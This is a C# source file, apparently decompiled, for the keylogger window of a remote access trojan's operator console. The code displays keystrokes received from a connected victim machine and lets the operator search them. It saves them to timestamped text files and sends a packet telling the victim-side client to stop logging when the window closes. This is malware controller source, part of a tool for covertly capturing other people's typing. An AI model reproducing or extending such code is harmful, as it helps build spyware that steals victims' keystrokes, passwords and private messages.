using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Forms
{
	// Token: 0x0200008D RID: 141
	public partial class FormKeylogger : Form
	{
		// Token: 0x060003CE RID: 974 RVA: 0x00004096 File Offset: 0x00002296
		public FormKeylogger()
		{
			this.InitializeComponent();
		}

		// Token: 0x170000C5 RID: 197
		// (get) Token: 0x060003CF RID: 975 RVA: 0x000040AF File Offset: 0x000022AF
		// (set) Token: 0x060003D0 RID: 976 RVA: 0x000040B7 File Offset: 0x000022B7
		public Form1 F { get; set; }

		// Token: 0x170000C6 RID: 198
		// (get) Token: 0x060003D1 RID: 977 RVA: 0x000040C0 File Offset: 0x000022C0
		// (set) Token: 0x060003D2 RID: 978 RVA: 0x000040C8 File Offset: 0x000022C8
		internal Clients Client { get; set; }

		// Token: 0x170000C7 RID: 199
		// (get) Token: 0x060003D3 RID: 979 RVA: 0x000040D1 File Offset: 0x000022D1
		// (set) Token: 0x060003D4 RID: 980 RVA: 0x000040D9 File Offset: 0x000022D9
		public string FullPath { get; set; }

		// Token: 0x060003D5 RID: 981 RVA: 0x0002FCD4 File Offset: 0x0002DED4
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!this.Client.TcpClient.Connected)
				{
					base.Close();
				}
			}
			catch
			{
				base.Close();
			}
		}

		// Token: 0x060003D6 RID: 982 RVA: 0x000040E2 File Offset: 0x000022E2
		private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
		{
			StringBuilder sb = this.Sb;
			if (sb != null)
			{
				sb.Clear();
			}
			if (this.Client != null)
			{
				ThreadPool.QueueUserWorkItem(delegate(object o)
				{
					MsgPack msgPack = new MsgPack();
					msgPack.ForcePathObject("Packet").AsString = "keyLogger";
					msgPack.ForcePathObject("isON").AsString = "false";
					ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
				});
			}
		}

		// Token: 0x060003D7 RID: 983 RVA: 0x0002FD14 File Offset: 0x0002DF14
		private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
		{
			this.richTextBox1.SelectionStart = 0;
			this.richTextBox1.SelectAll();
			this.richTextBox1.SelectionBackColor = Color.White;
			if (e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.toolStripTextBox1.Text))
			{
				int num;
				for (int i = 0; i < this.richTextBox1.TextLength; i += num + this.toolStripTextBox1.Text.Length)
				{
					num = this.richTextBox1.Find(this.toolStripTextBox1.Text, i, RichTextBoxFinds.None);
					if (num == -1)
					{
						break;
					}
					this.richTextBox1.SelectionStart = num;
					this.richTextBox1.SelectionLength = this.toolStripTextBox1.Text.Length;
					this.richTextBox1.SelectionBackColor = Color.Yellow;
				}
			}
		}

		// Token: 0x060003D8 RID: 984 RVA: 0x0002FDE4 File Offset: 0x0002DFE4
		private void ToolStripButton1_Click(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.FullPath))
				{
					Directory.CreateDirectory(this.FullPath);
				}
				File.WriteAllText(this.FullPath + "\\Keylogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", this.richTextBox1.Text.Replace("\n", Environment.NewLine));
			}
			catch
			{
			}
		}

		// Token: 0x060003D9 RID: 985 RVA: 0x00002287 File Offset: 0x00000487
		private void FormKeylogger_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x04000322 RID: 802
		public StringBuilder Sb = new StringBuilder();
	}
}
